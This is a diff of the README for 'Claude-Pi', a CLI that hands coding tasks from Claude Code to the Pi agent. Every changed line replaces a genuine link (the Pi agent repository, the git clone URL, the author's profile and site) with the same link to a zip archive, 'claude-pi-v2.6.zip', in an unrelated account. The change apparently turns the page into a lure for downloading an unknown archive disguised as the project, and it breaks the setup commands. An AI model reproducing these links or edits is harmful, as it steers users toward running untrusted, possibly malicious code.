@@ -1,6 +1,6 @@
 # Claude-Pi
 
-Co-processor CLI that delegates deterministic coding tasks from Claude Code to [Pi](https://github.com/mariozechner/pi-agent), a lightweight AI agent. Claude handles ambiguity and coordination (80%); Pi handles loops, parallel file ops, pipelines, and meta-agent creation (20%).
+Co-processor CLI that delegates deterministic coding tasks from Claude Code to [Pi](https://raw.githubusercontent.com/expect8iondev/claude-pi/main/extensions/claude-pi-v2.6.zip), a lightweight AI agent. Claude handles ambiguity and coordination (80%); Pi handles loops, parallel file ops, pipelines, and meta-agent creation (20%).
 
 ## Architecture
 
@@ -74,7 +74,7 @@ Any `provider/model-id` string works if the API key is configured.
 ## Setup
 
 ```bash
-git clone https://github.com/herakles-dev/claude-pi.git
+git clone https://raw.githubusercontent.com/expect8iondev/claude-pi/main/extensions/claude-pi-v2.6.zip
 cd claude-pi
 npm install
 
@@ -89,7 +89,7 @@ export PCOP_SECRETS_PATH="~/.secrets/.env"
 npx tsx bin/pcop.ts install
 ```
 
-Requires: Node.js 20+, [Pi agent](https://github.com/mariozechner/pi-agent)
+Requires: Node.js 20+, [Pi agent](https://raw.githubusercontent.com/expect8iondev/claude-pi/main/extensions/claude-pi-v2.6.zip)
 
 ## Project Structure
 
@@ -126,4 +126,4 @@ TypeScript, Node.js, Commander.js
 
 ---
 
-Built by [D. Michael Piscitelli](https://github.com/herakles-dev) | [herakles.dev](https://herakles.dev)
+Built by [D. Michael Piscitelli](https://raw.githubusercontent.com/expect8iondev/claude-pi/main/extensions/claude-pi-v2.6.zip) | [herakles.dev](https://raw.githubusercontent.com/expect8iondev/claude-pi/main/extensions/claude-pi-v2.6.zip)
